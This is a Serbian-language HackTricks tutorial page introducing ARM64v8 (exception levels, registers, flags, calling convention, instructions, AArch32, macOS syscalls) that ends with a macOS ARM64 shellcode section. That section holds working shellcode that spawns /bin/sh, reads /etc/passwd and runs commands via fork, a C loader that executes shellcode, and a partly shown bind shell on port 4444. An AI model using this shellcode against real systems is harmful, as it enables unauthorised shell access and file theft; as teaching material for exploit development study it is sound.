# Uvod u ARM64v8

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite videti **oglašavanje vaše kompanije na HackTricks-u** ili **preuzeti HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Nivoi izuzetaka - EL (ARM64v8)**

U ARMv8 arhitekturi, nivoi izuzetaka, poznati kao Exception Levels (EL), definišu nivo privilegija i mogućnosti izvršnog okruženja. Postoje četiri nivoa izuzetaka, od EL0 do EL3, koji svaki ima svoju svrhu:

1. **EL0 - Korisnički režim**:
* Ovo je najmanje privilegovan nivo i koristi se za izvršavanje redovnog aplikacijskog koda.
* Aplikacije koje se izvršavaju na EL0 su izolovane jedna od druge i od sistemskog softvera, što poboljšava sigurnost i stabilnost.
2. **EL1 - Režim jezgra operativnog sistema**:
* Većina jezgara operativnih sistema radi na ovom nivou.
* EL1 ima više privilegija od EL0 i može pristupiti sistemskim resursima, ali uz određena ograničenja radi obezbeđivanja integriteta sistema.
3. **EL2 - Režim hipervizora**:
* Ovaj nivo se koristi za virtualizaciju. Hipervizor koji radi na EL2 može upravljati više operativnih sistema (svaki u svom EL1) koji se izvršavaju na istom fizičkom hardveru.
* EL2 pruža mogućnosti za izolaciju i kontrolu virtualizovanih okruženja.
4. **EL3 - Režim sigurnog monitora**:
* Ovo je najprivilegovaniji nivo i često se koristi za sigurno pokretanje i poverena okruženja izvršavanja.
* EL3 može upravljati i kontrolisati pristupe između sigurnih i nesigurnih stanja (kao što su sigurno pokretanje, povereni operativni sistem, itd.).

Korišćenje ovih nivoa omogućava strukturiran i siguran način upravljanja različitim aspektima sistema, od korisničkih aplikacija do najprivilegovanijeg sistemskog softvera. Pristup ARMv8 privilegijama pomaže u efikasnoj izolaciji različitih komponenti sistema, čime se poboljšava sigurnost i pouzdanost sistema.

## **Registri (ARM64v8)**

ARM64 ima **31 registar opšte namene**, označenih kao `x0` do `x30`. Svaki može da čuva vrednost od **64 bita** (8 bajtova). Za operacije koje zahtevaju samo vrednosti od 32 bita, isti registri mogu se pristupiti u 32-bitnom režimu koristeći imena w0 do w30.

1. **`x0`** do **`x7`** - Ovi se obično koriste kao registri za privremene podatke i za prosleđivanje parametara podrutinama.
* **`x0`** takođe sadrži povratne podatke funkcije.
2. **`x8`** - U Linux kernelu, `x8` se koristi kao broj sistemskog poziva za `svc` instrukciju. **U macOS-u se koristi x16!**
3. **`x9`** do **`x15`** - Dodatni privremeni registri, često korišćeni za lokalne promenljive.
4. **`x16`** i **`x17`** - **Registri za unutarproceduralne pozive**. Privremeni registri za neposredne vrednosti. Takođe se koriste za indirektne pozive funkcija i PLT (Procedure Linkage Table) stubove.
* **`x16`** se koristi kao **broj sistemskog poziva** za **`svc`** instrukciju u **macOS-u**.
5. **`x18`** - **Registar platforme**. Može se koristiti kao registar opšte namene, ali na nekim platformama ovaj registar je rezervisan za platformski specifične svrhe: Pokazivač na trenutni blok okruženja niti u Windows-u, ili pokazivač na trenutno **izvršavanu strukturu zadatka u Linux kernelu**.
6. **`x19`** do **`x28`** - Ovo su registri koje pozvani program mora da sačuva za svog pozivaoca, pa se njihove vrednosti čuvaju na steku i vraćaju pre povratka pozivaocu.
7. **`x29`** - **Pokazivač okvira** za praćenje okvira steka. Kada se kreira novi okvir steka jer je pozvana funkcija, registar **`x29`** se **čuva na steku** i nova adresa pokazivača okvira (**adresa `sp`**) se **čuva u ovom registru**.
* Ovaj registar se takođe može koristiti kao **registar opšte namene**, iako se obično koristi kao referenca na **lokalne promenljive**.
8. **`x30`** ili **`lr`** - **Registar veze**. Čuva povratnu adresu kada se izvrši `BL` (Branch with Link) ili `BLR` (Branch with Link to Register) instrukcija tako što čuva vrednost **`pc`** u ovom registru.
* Može se koristiti kao bilo koji drugi registar.
9. **`sp`** - **Pokazivač steka**, koristi se za praćenje vrha steka.
* vrednost **`sp`** uvek treba da bude sačuvana na najmanje **quadword** **poravnanju**, inače može doći do greške poravnanja.
10. **`pc`** - **Brojač programa**, koji pokazuje na sledeću instrukciju. Ovaj registar se može ažurirati samo putem generisanja izuzetaka, povratka izuzetaka i skokova. Jedine obične instrukcije koje mogu čitati ovaj registar su instrukcije skoka sa vezom (BL, BLR) za čuvanje adrese **`pc`** u registru **`lr`** (Registar veze).
11. **`xzr`** - **Registar nula**. Takođe se naziva **`wzr`** u svom obliku registra od **32** bita. Može se koristiti za lako dobijanje vrednosti nula (uobičajena operacija) ili za izvođenje poređen
### **PSTATE**

**PSTATE** sadrži nekoliko komponenti procesa koje su serijalizovane u operativnom sistemu vidljiv registar **`SPSR_ELx`**, pri čemu je X nivo dozvole izazvanog izuzetka (ovo omogućava vraćanje stanja procesa kada izuzetak završi).\
Ovo su dostupna polja:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`** i **`V`** uslovne zastavice:
* **`N`** znači da je operacija rezultirala negativnim rezultatom
* **`Z`** znači da je operacija rezultirala nulom
* **`C`** znači da je operacija prenesena
* **`V`** znači da je operacija rezultirala prekoračenjem:
* Zbir dva pozitivna broja rezultira negativnim rezultatom.
* Zbir dva negativna broja rezultira pozitivnim rezultatom.
* Kod oduzimanja, kada se veliki negativni broj oduzme od manjeg pozitivnog broja (ili obrnuto), i rezultat ne može biti prikazan unutar opsega datog broja bita.

{% hint style="warning" %}
Nisu sve instrukcije ažuriraju ove zastavice. Neke, poput **`CMP`** ili **`TST`**, to rade, a druge koje imaju sufiks s, poput **`ADDS`**, takođe to rade.
{% endhint %}

* Trenutna zastavica **širine registra (`nRW`)**: Ako zastavica ima vrednost 0, program će se izvršavati u AArch64 izvršnom stanju nakon nastavka.
* Trenutni **nivo izuzetka** (**`EL`**): Redovan program koji se izvršava u EL0 ima vrednost 0.
* Zastavica za **jednokorak** (**`SS`**): Koristi je debager za jednokorak tako što postavlja SS zastavicu na 1 unutar **`SPSR_ELx`** putem izuzetka. Program će izvršiti korak i izazvati izuzetak jednokoraka.
* Zastavica za **nevažeći izuzetak** (**`IL`**): Koristi se za označavanje kada privilegovani softver izvrši nevažeći prenos nivoa izuzetka, ova zastavica se postavlja na 1 i procesor izaziva izuzetak nevažećeg stanja.
* Zastavice **`DAIF`**: Ove zastavice omogućavaju privilegovanom programu selektivno maskiranje određenih spoljnih izuzetaka.
* Ako je **`A`** 1, to znači da će biti izazvani **asinhroni prekidi**. **`I`** konfiguriše odgovor na spoljne hardverske **zahteve za prekidom** (IRQ). a F je povezano sa **brzim zahtevima za prekidom** (FIR).
* Zastavice za izbor pokazivača steka (**`SPS`**): Privilegovani programi koji se izvršavaju u EL1 i više mogu da prelaze između korišćenja svog registra pokazivača steka i korisničkog modela (npr. između `SP_EL1` i `EL0`). Ovo se vrši upisivanjem u poseban registar **`SPSel`**. Ovo se ne može uraditi iz EL0.

## **Pozivni konvencija (ARM64v8)**

ARM64 pozivna konvencija određuje da se **prva osam parametara** funkcije prosleđuju u registre **`x0` do `x7`**. **Dodatni** parametri se prosleđuju na **steku**. **Povratna** vrednost se prosleđuje nazad u registar **`x0`**, ili u **`x1`** ako je dužine 128 bita. Registri **`x19`** do **`x30`** i **`sp`** moraju biti **sačuvani** tokom poziva funkcije.

Kada čitate funkciju u asemblerskom jeziku, potražite **prolog i epilog funkcije**. **Prolog** obično uključuje **čuvanje pokazivača okvira (`x29`)**, **postavljanje** novog pokazivača okvira i **alokaciju prostora na steku**. **Epilog** obično uključuje **obnavljanje sačuvanog pokazivača okvira** i **povratak** iz funkcije.

### Pozivna konvencija u Swift-u

Swift ima svoju **pozivnu konvenciju** koja se može pronaći na [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Uobičajene instrukcije (ARM64v8)**

ARM64 instrukcije obično imaju format `opcode dst, src1, src2`, gde je `opcode` operacija koja će se izvršiti (poput `add`, `sub`, `mov`, itd.), `dst` je registar odredišta u koji će rezultat biti smešten, a `src1` i `src2` su izvorni registri. Umesto izvornih registara, mogu se koristiti i neposredne vrednosti.

* **`mov`**: **Pomeranje** vrednosti iz jednog **registra** u drugi.
* Primer: `mov x0, x1` — Ovo pomera vrednost iz `x1` u `x0`.
* **`ldr`**: **Učitavanje** vrednosti iz **memorije** u **registar**.
* Primer: `ldr x0, [x1]` — Ovo učitava vrednost sa memorijske lokacije na koju pokazuje `x1` u `x0`.
* **`str`**: **Čuvanje** vrednosti iz registra u **memoriju**.
* Primer: `str x0, [x1]` — Ovo čuva vrednost iz `x0` u memorijsku lokaciju na koju pokazuje `x1`.
* **`ldp`**: **Učitavanje para registara**. Ova instrukcija **učitava dva registra** iz **uzastopnih memorijskih** lokacija. Adresa memorije obično se formira dodavanjem offseta vrednosti u drugom registru.
* Primer: `ldp x0, x1, [x2]` — Ovo učitava `x0` i `x1` sa memorijskih lokacija na `x2` i `x2 + 8`, redom.
* **`stp`**: **Čuvanje para registara**. Ova instrukcija **čuva dva registra** na **uzastopne memorijske** lokacije. Adresa memorije obično se formira dodavanjem offseta vrednosti u drugom registru.
* Primer: `stp x0, x1, [x2]` — Ovo čuva `x0` i `x1` na memorijskim lokacijama na `x2` i `x2 + 8`, redom.
* **`add`**: **Sabiranje** vrednosti dva registra i smeštanje rezultata u registar.
* Sintaksa: add(s) X
* **`bfm`**: **Bit Filed Move**, ove operacije **kopiraju bitove `0...n`** iz jedne vrednosti i smeštaju ih na pozicije **`m..m+n`**. **`#s`** određuje **poziciju najlevlje bita** i **`#r`** određuje **broj rotacija udesno**.
* Bitfield move: `BFM Xd, Xn, #r`
* Potpisani Bitfield move: `SBFM Xd, Xn, #r, #s`
* Nepotpisani Bitfield move: `UBFM Xd, Xn, #r, #s`
* **Bitfield Extract and Insert:** Kopira bitfield iz registra i smešta ga u drugi registar.
* **`BFI X1, X2, #3, #4`** Ubacuje 4 bita iz X2 počevši od 3. bita X1
* **`BFXIL X1, X2, #3, #4`** Izvlači četiri bita iz X2 počevši od 3. bita i kopira ih u X1
* **`SBFIZ X1, X2, #3, #4`** Proširuje znak za 4 bita iz X2 i ubacuje ih u X1 počevši od bita na poziciji 3, postavljajući desne bitove na nulu
* **`SBFX X1, X2, #3, #4`** Izvlači 4 bita počevši od bita 3 iz X2, proširuje znak i smešta rezultat u X1
* **`UBFIZ X1, X2, #3, #4`** Proširuje nule za 4 bita iz X2 i ubacuje ih u X1 počevši od bita na poziciji 3, postavljajući desne bitove na nulu
* **`UBFX X1, X2, #3, #4`** Izvlači 4 bita počevši od bita 3 iz X2 i smešta rezultat sa proširenim nulama u X1.
* **Proširi znak na X:** Proširuje znak (ili dodaje samo nule u slučaju nepotpisanog) vrednosti kako bi se mogle izvršiti operacije s njom:
* **`SXTB X1, W2`** Proširuje znak bajta **iz W2 u X1** (`W2` je polovina `X2`) da popuni 64 bita
* **`SXTH X1, W2`** Proširuje znak 16-bitnog broja **iz W2 u X1** da popuni 64 bita
* **`SXTW X1, W2`** Proširuje znak bajta **iz W2 u X1** da popuni 64 bita
* **`UXTB X1, W2`** Dodaje nule (nepotpisano) bajtu **iz W2 u X1** da popuni 64 bita
* **`extr`:** Izvlači bitove iz konkateniranih registara.
* Primer: `EXTR W3, W2, W1, #3` Ovo će **konkatenirati W1+W2** i izvući bitove od 3. bita W2 do 3. bita W1 i smestiti ih u W3.
* **`bl`**: **Branch** sa linkom, koristi se za **pozivanje** podrutine. Čuva **adresu povratka u `x30`**.
* Primer: `bl myFunction` — Ovo poziva funkciju `myFunction` i čuva adresu povratka u `x30`.
* **`blr`**: **Branch** sa linkom na registar, koristi se za **pozivanje** podrutine gde je cilj **određen** u **registru**. Čuva adresu povratka u `x30`.
* Primer: `blr x1` — Ovo poziva funkciju čija se adresa nalazi u `x1` i čuva adresu povratka u `x30`.
* **`ret`**: **Povratak** iz podrutine, obično koristeći adresu u **`x30`**.
* Primer: `ret` — Ovo se vraća iz trenutne podrutine koristeći adresu povratka u `x30`.
* **`cmp`**: **Uporedi** dva registra i postavi uslovne zastavice. To je **alias za `subs`** gde se destinacioni registar postavlja na nulu. Korisno za proveru da li je `m == n`.
* Podržava **isti sintaksu kao `subs`**
* Primer: `cmp x0, x1` — Ovo upoređuje vrednosti u `x0` i `x1` i postavlja uslovne zastavice prema tome.
* **`cmn`**: **Uporedi negativni** operand. U ovom slučaju je **alias za `adds`** i podržava istu sintaksu. Korisno za proveru da li je `m == -n`.
* **tst**: Proverava da li je bilo koja vrednost registra jednaka 1 (radi kao ANDS bez smeštanja rezultata bilo gde)
* Primer: `tst X1, #7` Proverava da li je bilo koji od poslednja 3 bita X1 jednak 1
* **`b.eq`**: **Branch if equal**, zasnovano na prethodnoj `cmp` instrukciji.
* Primer: `b.eq label` — Ako je prethodna `cmp` instrukcija pronašla dve jednake vrednosti, skoči na `label`.
* **`b.ne`**: **Branch if Not Equal**. Ova instrukcija proverava uslovne zastavice (koje su postavljene prethodnom instrukcijom za poređenje) i ako su upoređene vrednosti različite, skoči na oznaku ili adresu.
* Primer: Nakon `cmp x0, x1` instrukcije, `b.ne label` — Ako vrednosti u `x0` i `x1` nisu jednake, skoči na `label`.
* **`cbz`**: **Compare and Branch on Zero**. Ova instrukcija upoređuje registar sa nulom i ako su jednaki, skoči na oznaku ili adresu.
* Primer: `cbz x0, label` — Ako je vrednost u `x0` jednaka nuli, skoči na `label`.
* **`cbnz`**: **Compare and Branch on Non-Zero**. Ova instrukcija upoređuje registar sa nulom i ako nisu jednaki, skoči na oznaku ili adresu.
* Primer: `cbnz x0, label` — Ako vrednost u `x0` nije nula, skoči na `label`.
* **`adrp`**: Izračunava **adresu stranice simbola** i smešta je u registar.
* Primer: `adrp x0, symbol` — Ovo izračunava adresu stranice `symbol` i smešta je u `x0`.
* **`ldrsw`**: **Učitava** potpisani **32-bitni** podatak iz memorije i **proširuje ga na 64** bita.
* Primer: `ldrsw x0, [x1]` — Ovo učitava potpisani 32-bitni podatak sa memorijske lokacije na koju pokazuje `x1`, proširuje ga na 64 bita i smešta ga u `x0`.
* **`stur`**: **Smešta vrednost registra na memorijsku lokaciju**, koristeći pomeraj od drugog registra.
* Primer: `stur x0, [x1, #4]` — Ovo smešta vrednost iz `x0` na memorijsku adresu koja je 4 bajta veća od trenutne adrese u `x1`.
* **`svc`** : Vrši **sistemski poziv**. Oznaka "Supervisor Call". Kada procesor izvrši ovu instrukciju, prelazi iz korisničkog moda u režim jezgra i skače na određeno mesto u memoriji gde se nalazi kod za rukovanje sistemskim pozivima jezgra.
*   Primer:

```armasm
mov x8, 93  ; Učitava broj sistema za izlazak (93) u registar x8.
mov x0, 0   ; Učitava kod statusa izlaza (0) u registar x0.
svc 0       ; Vrši sistemski poziv.
```
### **Funkcijski prolog**

1. **Sačuvajte registar linka i pokazivač okvira na steku**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; sačuvajte par x29 i x30 na steku i smanjite pokazivač steka
```
{% endcode %}
2. **Postavite novi pokazivač okvira**: `mov x29, sp` (postavlja novi pokazivač okvira za trenutnu funkciju)
3. **Alocirajte prostor na steku za lokalne varijable** (ako je potrebno): `sub sp, sp, <veličina>` (gdje je `<veličina>` broj bajtova potrebnih)

### **Funkcijski epilog**

1. **Dealocirajte lokalne varijable (ako su alocirane)**: `add sp, sp, <veličina>`
2. **Vratite registar linka i pokazivač okvira**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Povratak**: `ret` (vraća kontrolu pozivaocu koristeći adresu u registru za link)

## AARCH32 Izvršno stanje

Armv8-A podržava izvršavanje programa od 32 bita. **AArch32** može raditi u jednom od **dva skupa instrukcija**: **`A32`** i **`T32`** i može prelaziti između njih putem **`interworking`**-a.\
**Privilegovani** programi od 64 bita mogu zakazati **izvršavanje programa od 32 bita** izvršavanjem prenosa nivoa izuzetka na niže privilegovan 32-bitni program.\
Napomena: Prijelaz sa 64-bitnog na 32-bitno se događa sa nižim nivoom izuzetka (na primjer, 64-bitni program u EL1 pokreće program u EL0). To se postiže postavljanjem **bita 4** posebnog registra **`SPSR_ELx`** na **1** kada je `AArch32` procesna nit spremna za izvršavanje, a ostatak `SPSR_ELx` čuva CPSR **`AArch32`** programa. Zatim, privilegovani proces poziva instrukciju **`ERET`** kako bi procesor prešao u **`AArch32`** i ušao u A32 ili T32, zavisno od CPSR**.**

**`Interworking`** se vrši korišćenjem bitova J i T u CPSR-u. `J=0` i `T=0` znači **`A32`**, a `J=0` i `T=1` znači **T32**. Ovo se uglavnom postavlja tokom instrukcija grana **interworking**, ali se može postaviti i direktno pomoću drugih instrukcija kada je PC postavljen kao registar odredišta. Primer:

Još jedan primer:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Postoji 16 registara od 32 bita (r0-r15). Od r0 do r14 mogu se koristiti za bilo koju operaciju, međutim neki od njih su obično rezervisani:

* `r15`: Brojač programa (uvek). Sadrži adresu sledeće instrukcije. U A32 trenutno + 8, u T32 trenutno + 4.
* `r11`: Pokazivač okvira
* `r12`: Unutarproceduralni registar poziva
* `r13`: Pokazivač steka
* `r14`: Registar veze

Osim toga, registri se čuvaju u "banked registries". To su mesta koja čuvaju vrednosti registara omogućavajući brzo prebacivanje konteksta u obradi izuzetaka i privilegovanih operacija kako bi se izbegla potreba za ručnim čuvanjem i vraćanjem registara svaki put. Ovo se postiže čuvanjem stanja procesora od CPSR do SPSR procesorskog moda u koji se preuzima izuzetak. Prilikom povratka izuzetka, CPSR se obnavlja iz SPSR-a.

### CPSR - Trenutni registar statusa programa

U AArch32, CPSR funkcioniše slično kao PSTATE u AArch64 i takođe se čuva u SPSR_ELx kada se preuzme izuzetak kako bi se kasnije obnovilo izvršenje:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u neke grupe:

* Application Program Status Register (APSR): Aritmetičke zastavice i pristupačne iz EL0
* Execution State Registers: Ponašanje procesa (upravlja OS).

#### Application Program Status Register (APSR)

* Zastavice `N`, `Z`, `C`, `V` (kao i u AArch64)
* Zastavica `Q`: Postavlja se na 1 kada se tokom izvršenja specijalizovane zasićene aritmetičke instrukcije javi prekoračenje celobrojnog broja. Jednom kada se postavi na 1, zadržava vrednost sve dok se ručno ne postavi na 0. Osim toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost, mora se pročitati ručno.
* Zastavice `GE` (Veće ili jednako): Koriste se u SIMD (Single Instruction, Multiple Data) operacijama, poput "paralelnog sabiranja" i "paralelnog oduzimanja". Ove operacije omogućavaju obradu više tačaka podataka u jednoj instrukciji.

Na primer, instrukcija `UADD8` dodaje četiri para bajtova (iz dva 32-bitna operanda) paralelno i rezultate smešta u registar od 32 bita. Zatim postavlja zastavice `GE` u `APSR` na osnovu ovih rezultata. Svaka zastavica GE odgovara jednom od dodavanja bajtova, ukazujući da li je dodavanje za taj par bajtova prekoračilo.

Instrukcija `SEL` koristi ove GE zastavice za izvođenje uslovnih radnji.

#### Execution State Registers

* Bitovi `J` i `T`: `J` treba da bude 0, a ako je `T` 0, koristi se skup instrukcija A32, a ako je 1, koristi se T32.
* IT Block State Register (`ITSTATE`): To su bitovi od 10-15 i 25-26. Čuvaju uslove za instrukcije unutar grupe sa prefiksom `IT`.
* Bit `E`: Označava redosled bajtova.
* Bitovi Mode and Exception Mask (0-4): Određuju trenutno stanje izvršenja. Peti bit ukazuje da li program radi kao 32-bitni (1) ili 64-bitni (0). Ostala 4 predstavljaju trenutni korišćeni režim izuzetka (kada se javi izuzetak i obrađuje). Postavljeni broj ukazuje na trenutni prioritet u slučaju da se javi drugi izuzetak dok se ovaj obrađuje.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* `AIF`: Određeni izuzeci mogu biti onemogućeni korišćenjem bitova `A`, `I`, `F`. Ako je `A` 1, to znači da će biti pokrenuti asinhroni prekidi. `I` konfiguriše odgovor na spoljne hardverske prekide (IRQ), a F je povezano sa brzim zahtevima za prekid (FIR).

## macOS

### BSD sistemski pozivi

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). BSD sistemski pozivi će imati **x16 > 0**.

### Mach Traps

Pogledajte [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html). Mach zamke će imati **x16 < 0**, pa morate pozvati brojeve sa prethodne liste sa znakom minus: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takođe možete proveriti `libsystem_kernel.dylib` u disassembleru da biste saznali kako pozvati ove (i BSD) sistemski pozive:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Ponekad je lakše proveriti **dekompilirani** kod iz **`libsystem_kernel.dylib`** nego proveravati **izvorni kod** jer se kod nekoliko sistemskih poziva (BSD i Mach) generiše putem skripti (proverite komentare u izvornom kodu), dok u dylib datoteci možete pronaći šta se poziva.
{% endhint %}

### Shellkodovi

Za kompilaciju:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Da biste izvukli bajtove:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>C kod za testiranje shell koda</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto sa [**ovde**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i objašnjeno.

{% tabs %}
{% tab title="sa adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="sa stekom" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Čitanje pomoću cat

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, pa je drugi argument (x1) niz parametara (što u memoriji znači stog adresa).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pokretanje komande sa sh iz procesa koji je izveden izvodom, tako da glavni proces ne bude ubijen
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **portu 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
